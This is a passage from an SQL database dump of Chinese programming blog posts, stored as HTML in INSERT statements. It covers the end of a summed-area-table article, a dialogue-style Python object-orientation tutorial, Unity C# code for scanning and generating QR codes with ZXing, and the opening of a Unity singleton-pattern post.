src=\"https://img-blog.csdnimg.cn/20210611232244414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDI0Mjc1,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611232315249.png#pic_center\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210611232333667.png#pic_center\" alt=\"在这里插入图片描述\"><br> 图中蓝色部分元素和的计算方式：<br> <span class=\"katex--display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"> R Q ( D ) = S A T ( D ) − S A T ( C ) − S A T ( B ) + S A T ( A ) RQ(D) = SAT(D) - SAT(C) - SAT(B) + SAT(A) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.00773em;\">R</span><span class=\"mord mathdefault\">Q</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">D</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">D</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.07153em;\">C</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.05017em;\">B</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose\">)</span></span></span></span></span></span><br> 其中，<br> <span class=\"katex--display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"> S A T ( A ) = S A T ( A x ′ , A y ′ ) SAT(A) = SAT(A_{x\'},A_{y\'}) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1.03611em; vertical-align: -0.286108em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.32798em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.682829em;\"><span class=\"\" style=\"top: -2.786em; margin-right: 0.0714286em;\"><span class=\"pstrut\" style=\"height: 2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.32798em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.682829em;\"><span class=\"\" style=\"top: -2.786em; margin-right: 0.0714286em;\"><span class=\"pstrut\" style=\"height: 2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.286108em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></span></p> \n <h1><a id=\"_40\"></a>分析</h1> \n <p>时间复杂度O(M*N)<br> 空间复杂度O(M*N)</p> \n <p>数据精度会稍有损失，但是影响不大。<br> 二维SAT进行计算时，行与行之间是独立的，可以并行计算。</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 1);
INSERT INTO `t_article` VALUES (53, '其实python面向对象3分钟就可以入门（14）', '<div id=\"content_views\" class=\"markdown_views prism-tomorrow-night-eighties\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>本系列文章将会以通俗易懂的对话方式进行教学，对话中将涵盖了新手在学习中的一般问题。此系列将会持续更新，包括别的语言以及实战都将使用对话的方式进行教学，基础编程语言教学适用于零基础小白，之后实战课程也将会逐步更新。</p> \n <p>若有想学习的内容可以在评论区留言，根据大家的要求持续更新。点赞过十万就算化成灰我也更新下一篇。（肯定不到，也会更的。）</p> \n <p>有问题也可以在评论区留言，也可以私聊我加我好友共同交流一起进步~</p> \n <p><strong>喜欢内容欢迎关注我、评论、点赞、收藏，这对我很重要，谢谢~</strong></p> \n <hr> \n <h2><a id=\"_10\"></a>我的其它教程</h2> \n <p>教程点击进去将会有目录</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/114240763\">《看聊天记录都学不会C语言？太菜了吧（1）我在大佬群里问基础问题没人理？</a>——学习建议</p> \n <h1><a id=\"_15\"></a>目录</h1> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/116467649\">《看聊天记录都学不会Python到游戏实战？太菜了吧》python 写游戏好简单啊，我用键盘可以随意控制角色了【python 游戏实战 04】</a>—— 键盘控制角色移动</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/116299668\">《看聊天记录都学不会Python到游戏实战？太菜了吧》游戏角色开始动起来了，真帅！【python 游戏实战 03】</a>—— 角色移动</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/116297241\">《看聊天记录都学不会Python到游戏实战？太菜了吧》这是我第一次使用代码创建出一个窗口【python 游戏实战 02】</a>—— 创建游戏场景</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/116242306\">《看聊天记录都学不会Python到游戏实战？太菜了吧》这是我第一次使用代码创建出一个窗口【python 游戏实战 01】</a>—— 创建窗口</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/117755723\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（14）其实python面向对象3分钟就可以入门</a>—— 创建类、使用类方法</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/116521225\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（13）python 字典 2 分钟速解</a>—— 字典</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/116001497\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（12）python 的列表我从没想过会那么好用</a>—— 列表</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115999561\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（11）python里面while到底有多少知识点</a>—— break continue</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115643595\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（10）无底洞的循环</a>—— 循环初窥</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115643727\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（9）集万家之长不死 python</a>—— 导包</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115639683\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（8）我们开始做一个数字小游戏吧</a>—— 数字游戏开始做 导包</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115494760\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（7）我用函数写了个特洛伊木马</a>—— 自定义函数</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115473991\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（6）不会这个知识点代码越写越难</a>—— and or 逻辑运算</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115471025\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（5）用前朝的剑斩今朝的官</a>——if…else</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115382226\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（4）小白不知道这个知识点将会错漏百出</a>——if 与 层级</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115365794\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（3）都说123是字符不是数字</a>——输入与类型</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115342566\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（2）在python中加号竟然如此善变</a>——变量与运算</p> \n <p><a href=\"https://i1bit.blog.csdn.net/article/details/115315630\">《看聊天记录都学不会Python到游戏实战？太菜了吧》（1）装载Python神器！亮剑！</a>——helloworld</p> \n <hr> \n <h2><a id=\"_55\"></a>作者简介</h2> \n <p>作者名：1_bit</p> \n <p>简介：CSDN博客专家，2020年博客之星TOP5，蓝桥签约作者。15-16年曾在网上直播，带领一批程序小白走上程序员之路。欢迎各位小白加我咨询我相关信息，迷茫的你会找到答案。</p> \n <p>博客地址：<a href=\"https://i1bit.blog.csdn.net\">https://i1bit.blog.csdn.net</a></p> \n <hr> \n <p>🐰小C：这一节我们学习面向对象的内容。</p> \n <p>👸小媛：我没有对象怎么去面向着我的对象去编程呀，你是不是故意的？</p> \n <p>🐰小C：面向对象是编程的一个概念，你在想什么？</p> \n <p>👸小媛：你意思说代码都有对象了而我却没有？故意的是嘛。</p> \n <p>🐰小C：我…所以你到底学不学？</p> \n <p>👸小媛：学学学，赶紧的，我要吃代码狗粮。</p> \n <p>🐰小C：面向对象其实很简单，你可以理解为是一一个类别。例如你玩游戏，里面很多 npc，其实这些 npc 人物都有类似的属性，都有头发、眼睛、鼻子、身高、性别这些属性，但是我们创建这些对象每次并不需要每次去敲击代码为每一个去创建，我们只需要创建一个具体的类型，每次使用这个类型就可以了。</p> \n <p>👸小媛：听懂了一点，但是又没完全懂，你还是用实例说明吧。</p> \n <p>🐰小C：创建一个类需要用一个关键字 class，然后后面是一个名称，最后使用冒号表示结束。</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Human</span><span class=\"token punctuation\">:</span>\n</code></pre> \n <p>👸小媛：然后呢？</p> \n <p>🐰小C：然后我们在这个类型里面可以创建一些变量，这些变量就是这个类型的属性。在这里我们创建的这个类叫做 Human，是用来描述人的这一个类，人具有姓名、年龄、性别、身高等属性，我们可以在这个类中创建：</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Human</span><span class=\"token punctuation\">:</span>\n	name<span class=\"token operator\">=</span><span class=\"token string\">\"未命名\"</span>\n    age<span class=\"token operator\">=</span><span class=\"token number\">18</span>\n    height<span class=\"token operator\">=</span><span class=\"token number\">170</span>\n    sex<span class=\"token operator\">=</span><span class=\"token string\">\"男\"</span>\n</code></pre> \n <p>👸小媛：这样就创建3个属性了吗？</p> \n <p>🐰小C：是的，这样的话只要我们使用这个类型去创建具体的对象，例如小明、小红，这样就可以不用打太多的代码，直接创建这个类别的对象就可以直接拥有这些属性。</p> \n <p>👸小媛：怎么做呢？</p> \n <p>🐰小C：很简单，你看下面代码，就是创建一个具体类型。</p> \n <pre><code class=\"prism language-python\">xiaoming<span class=\"token operator\">=</span>Human<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>👸小媛：直接使用类型名一个圆括号？跟函数一样？</p> \n <p>🐰小C：对的，这就是创建。</p> \n <p>👸小媛：创建好后直接给 xiaoming 这样就创建了一个具体类型了？</p> \n <p>🐰小C：是的，但是这样并不能很好的表现类和对象，我们可以创建一个类方法，就是说这个类有什么功能，你看下面类里面的代码。</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Human</span><span class=\"token punctuation\">:</span>\n    name<span class=\"token operator\">=</span><span class=\"token string\">\"未命名\"</span>\n    age<span class=\"token operator\">=</span><span class=\"token number\">18</span>\n    height<span class=\"token operator\">=</span><span class=\"token number\">170</span>\n    sex<span class=\"token operator\">=</span><span class=\"token string\">\"男\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">say</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>👸小媛：咦？我看类里面有一个函数，这个函数有一个参数是self，这是啥？</p> \n <p>🐰小C：self 的意思是指向当前对象本身，在类里面的函数都需要使用这个 self，但这个self 并不需要传参数，因为 self 表示当前这个函数属于这个类。</p> \n <p>👸小媛：没明白。</p> \n <p>🐰小C：那我们添加一个新参数吧。</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Human</span><span class=\"token punctuation\">:</span>\n    name<span class=\"token operator\">=</span><span class=\"token string\">\"未命名\"</span>\n    age<span class=\"token operator\">=</span><span class=\"token number\">18</span>\n    height<span class=\"token operator\">=</span><span class=\"token number\">170</span>\n    sex<span class=\"token operator\">=</span><span class=\"token string\">\"男\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">say</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>say_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>say_str<span class=\"token punctuation\">)</span>\n</code></pre> \n <p>👸小媛：这样的话就可以传递一个参数，这个参数就是函数里面 print 显示的内容。</p> \n <p>🐰小C：是的，我给你看看这个函数怎么用吧。</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Human</span><span class=\"token punctuation\">:</span>\n    name<span class=\"token operator\">=</span><span class=\"token string\">\"未命名\"</span>\n    age<span class=\"token operator\">=</span><span class=\"token number\">18</span>\n    height<span class=\"token operator\">=</span><span class=\"token number\">170</span>\n    sex<span class=\"token operator\">=</span><span class=\"token string\">\"男\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">say</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>say_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>say_str<span class=\"token punctuation\">)</span>\n\nxiaoming<span class=\"token operator\">=</span>Human<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nxiaoming<span class=\"token punctuation\">.</span>say<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>👸小媛：直接用个小数点就可以使用这个函数？而且前面不是有一个self 的，怎么不用传参？</p> \n <p>🐰小C：因为刚刚我说过，self 是表示这个函数指向当前类，不需要传参，你就当做不存在就可以了。然后小数点你可以理解成“的”意思，也就是说，使用创建的这个对象 xiaoming 的 say 方法，这样就可以使用了。</p> \n <p>👸小媛：哈哈哈，解决了，我直接出现结果了。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210609225208963.png\" alt=\"\"><br> 🐰小C：哈哈哈，可以吧？那我们再创建几个方法。</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Human</span><span class=\"token punctuation\">:</span>\n    name<span class=\"token operator\">=</span><span class=\"token string\">\"未命名\"</span>\n    age<span class=\"token operator\">=</span><span class=\"token number\">18</span>\n    height<span class=\"token operator\">=</span><span class=\"token number\">170</span>\n    sex<span class=\"token operator\">=</span><span class=\"token string\">\"男\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">say</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>say_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>say_str<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">myname</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">myage</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">myheight</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>height<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">mysex</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>sex<span class=\"token punctuation\">)</span>\nxiaoming<span class=\"token operator\">=</span>Human<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nxiaoming<span class=\"token punctuation\">.</span>myname<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nxiaoming<span class=\"token punctuation\">.</span>myage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nxiaoming<span class=\"token punctuation\">.</span>myheight<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nxiaoming<span class=\"token punctuation\">.</span>mysex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>👸小媛：这些方法中的代码例如 self.sex 是啥意思？</p> \n <p>🐰小C：意思就是，self 是指当前对象本身，然后 self.sex 就是获取到当前对象本身的 sex 变量，这个时候就直接显示就可以了。</p> \n <p>👸小媛：哈哈哈，解决了。<br> <img src=\"https://img-blog.csdnimg.cn/20210609225530694.png\" alt=\"\"></p> \n <p>🐰小C：下一节我们再详细的讲解一下类吧。</p> \n <p>👸小媛：哈哈哈，好勒。</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (54, 'unityZXing二维码的生成与扫描', '<div id=\"content_views\" class=\"htmledit_views\"> \n <p>借鉴自某位大佬不记得了</p> \n <pre class=\"has\"><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing ZXing;\nusing UnityEngine.UI;\n/// &lt;summary&gt;\n/// 二维码扫描识别功能\n/// &lt;/summary&gt;\npublic class TestQRCodeScanning : MonoBehaviour {\n\n    [Header(\"摄像机检测界面\")]\n    public RawImage cameraTexture;//摄像机映射显示区域\n   \n    private WebCamTexture webCamTexture;//摄像机映射纹理\n    public Text text;//用来显示扫描信息\n    //二维码识别类\n    BarcodeReader barcodeReader;//库文件的对象（二维码信息保存的地方）\n\n    /// &lt;summary&gt;\n    /// 开启摄像机和准备工作\n    /// &lt;/summary&gt;\n    void DeviceInit()\n    {\n     \n\n        //1、获取所有摄像机硬件\n        WebCamDevice[] devices = WebCamTexture.devices;\n        //2、获取第一个摄像机硬件的名称\n        string deviceName = devices[0].name;//手机后置摄像机\n        //3、创建实例化一个摄像机显示区域\n        webCamTexture = new WebCamTexture(deviceName, 400, 300);\n        //4、显示的图片信息\n        cameraTexture.texture = webCamTexture;\n        //5、打开摄像机运行识别\n        webCamTexture.Play();\n\n        //6、实例化识别二维码信息存储对象\n        barcodeReader = new BarcodeReader();\n    }\n\n    Color32[] data;//二维码图片信息以像素点颜色信息数组存放\n\n    /// &lt;summary&gt;\n    /// 识别摄像机图片中的二维码信息\n    /// 打印二维码识别到的信息\n    /// &lt;/summary&gt;\n    void ScanQRCode()\n    {\n        //7、获取摄像机画面的像素颜色数组信息\n        data = webCamTexture.GetPixels32();\n        //8、获取图片中的二维码信息\n        Result result = barcodeReader.Decode(data,webCamTexture.width,webCamTexture.height);\n        //如果获取到二维码信息了，打印出来\n        if (result!=null)\n        {\n            Debug.Log(result.Text);//===》==》===》 这是从二维码识别出来的信息\n            text.text = result.Text;//显示扫描信息\n\n            //扫描成功之后的处理\n            IsScanning = false;\n            webCamTexture.Stop();\n        }\n    }\n\n\n    /// &lt;summary&gt;\n    /// Start 初始化函数\n    /// &lt;/summary&gt;\n    private void Start()\n    {\n        scanningButton.onClick.AddListener(ScanningButtonClick);\n    }\n\n\n    bool IsScanning = false;\n    float interval = 3;//扫描识别时间间隔\n    [SerializeField] Button scanningButton;\n    void ScanningButtonClick()\n    {\n        DeviceInit();\n        IsScanning = true;\n    }\n\n    private void Update()\n    {\n        if (IsScanning)\n        {\n            //每隔一段时间进行一次识别二维码信息\n            interval += Time.deltaTime;\n            if (interval&gt;=3)\n            {\n                interval = 0;\n                ScanQRCode();//开始扫描\n            }\n        }\n    }\n}\n</code></pre> \n <p>ZXing：<a href=\"https://archive.codeplex.com/?p=zxingnet\">https://archive.codeplex.com/?p=zxingnet</a></p> \n <p>下载之后把zxing.unity.dll拷贝到Unity的Plugins文件夹下，</p> \n <p>zxing.unity.dll下载之后的位置找到UnityDemo/Assets下</p> \n <pre class=\"has\"><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEngine.UI;\nusing ZXing;\n//二维码的生成\npublic class TestQRCodeDraw : MonoBehaviour {\n\n    [Header(\"绘制好的二维码显示界面\")]\n    public RawImage QRCode;\n    //二维码绘制类\n    BarcodeWriter barcodeWriter;\n    [SerializeField] Button drawbutton;\n    /// &lt;summary&gt;\n    /// 将制定字符串信息转换成二维码图片信息\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"formatStr\"&gt;要生产二维码的字符串信息&lt;/param&gt;\n    /// &lt;param name=\"width\"&gt;二维码的宽度&lt;/param&gt;\n    /// &lt;param name=\"height\"&gt;二维码的高度&lt;/param&gt;\n    /// &lt;returns&gt;返回二维码图片的颜色数组信息&lt;/returns&gt;\n    Color32[] GeneQRCode(string formatStr,int width,int height)\n    {\n        //绘制二维码前进行一些设置\n        ZXing.QrCode.QrCodeEncodingOptions options =\n            new ZXing.QrCode.QrCodeEncodingOptions();\n        //设置字符串转换格式，确保字符串信息保持正确\n        options.CharacterSet = \"UTF-8\";\n        //设置绘制区域的宽度和高度的像素值\n        options.Width = width;\n        options.Height = height;\n        //设置二维码边缘留白宽度（值越大留白宽度大，二维码就减小）\n        options.Margin = 1;\n\n        //实例化字符串绘制二维码工具\n        barcodeWriter = new BarcodeWriter {Format=BarcodeFormat.QR_CODE,Options=options };\n        //进行二维码绘制并进行返回图片的颜色数组信息\n        return barcodeWriter.Write(formatStr); \n\n    }\n   \n    /// &lt;summary&gt;\n    /// 根据二维码图片信息绘制指定字符串信息的二维码到指定区域\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"str\"&gt;要生产二维码的字符串信息&lt;/param&gt;\n    /// &lt;param name=\"width\"&gt;二维码的宽度&lt;/param&gt;\n    /// &lt;param name=\"height\"&gt;二维码的高度&lt;/param&gt;\n    /// &lt;returns&gt;返回绘制好的图片&lt;/returns&gt;\n     Texture2D ShowQRCode(string str,int width,int height)\n    {\n        //实例化一个图片类\n        Texture2D t = new Texture2D(width, height);\n        //获取二维码图片颜色数组信息\n        Color32[] col32 = GeneQRCode(str, width, height);\n        //为图片设置绘制像素颜色信息\n        t.SetPixels32(col32);\n        //设置信息更新应用下\n        t.Apply();\n        //将整理好的图片信息显示到指定区域中\n        return t;\n    }\n\n   /// &lt;summary&gt;\n   /// 开始绘制指定信息的二维码\n   /// &lt;/summary&gt;\n   /// &lt;param name=\"formatStr\"&gt;&lt;/param&gt;\n    void DrawQRCode(string formatStr)\n    {\n        //注意：这个宽高度大小256不要变。不然生成的信息不正确\n        //256有可能是这个ZXingNet插件指定大小的绘制像素点数值\n        Texture2D t = ShowQRCode(formatStr, 256, 256);\n\n        //显示到UI界面的图片上\n        QRCode.texture = t;\n    }\n\n\n    public string QRCodeText = \"二维码\";\n    void DrawButtonClick()\n    {\n        DrawQRCode(QRCodeText);\n    }\n\n    private void Start()\n    {\n        drawbutton.onClick.AddListener(DrawButtonClick);\n    }\n}\n</code></pre> \n <p>&nbsp;</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (55, '应粉丝邀约，写一篇单例模式在Unity的实际应用，记得一键三连哦', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <blockquote> \n  <p>推荐阅读</p> \n  <ul>\n   <li><a href=\"https://blog.csdn.net/q764424567/\">CSDN主页</a></li>\n   <li><a href=\"https://github.com/764424567\">GitHub开源地址</a></li>\n   <li><a href=\"https://github.com/764424567/Unity-plugin\">Unity3D插件分享</a></li>\n   <li><a href=\"https://www.jianshu.com/u/6475c7b88cd3\">简书地址</a></li>\n   <li><a href=\"https://www.qq764424567.top/\">我的个人博客</a></li>\n   <li><a href=\"https://jq.qq.com/?_wv=1027&amp;k=5sQDw5DN\">QQ群：1040082875</a></li>\n  </ul> \n </blockquote> \n <h2><a id=\"font_colorredfont___9\"></a><font color=\"red\">❤</font> 一、前言</h2> \n <p>最近，有粉丝问我：</p> \n <blockquote> \n  <p>粉丝：“怎么用单例模式呀？”<br> 我：“https://blog.csdn.net/weixin_43430200/article/details/107459447”<br> 粉丝：“我知道咋写，就是不知道怎么用”<br> 我：“好家伙，那我就给你演示一下怎么用吧”</p> \n </blockquote> \n <h2><a id=\"font_colorgreedfont___18\"></a><font color=\"greed\">❤</font> 二、单例模式介绍</h2> \n <p>首先要了解，单例模式是一种常用的软件设计模式，定义是单例对象的类只能允许一个实例存在，在许多时候整个系统只需要拥有一个全局对象，有利于协调系统整体的行为。</p> \n <p>比如，服务器程序，将配置信息存放到一个文件中，然后使用一个单例对象进行读取，其他服务进程中的其他对象再通过这个单例去获取这些配置信息，简化了配置管理。</p> \n <p>单例模式的结构图如下图所示：<br> <img src=\"https://img-blog.csdnimg.cn/20210611105212518.png\" alt=\"在这里插入图片描述\"><br> 那么，单例模式在Unity中又有那些应用场景呢：</p> \n <blockquote> \n  <p>1、在使用Unity开发项目的时候，经常会遇到需要一个管理类来管理一些全局的变量和方法，比如GameManager用于记录各种需要在整个游戏中用到数据。</p> \n </blockquote> \n <blockquote> \n  